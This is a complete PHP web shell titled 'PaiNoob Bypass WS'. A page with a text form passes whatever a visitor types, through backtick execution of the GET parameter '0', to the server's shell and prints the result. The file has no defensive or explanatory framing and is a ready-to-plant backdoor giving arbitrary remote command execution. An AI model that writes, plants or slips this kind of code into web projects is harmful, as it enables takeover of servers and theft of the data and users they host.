<html>
<head><title>PaiNoob Bypass WS</title></head>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="0" id="0" size="100" value="<?php echo htmlspecialchars($_GET['0'] ?? ''); ?>" onfocus="var value = this.value; this.value = null; this.value = value;" >
<input type="SUBMIT" value="Send">
</form>
<pre>
<?php
    if (isset($_GET['0'])) {
        echo `$_GET[0]`;
    }
?>
</pre>
</body>
<script>document.getElementById("0").focus();</script>
</html>
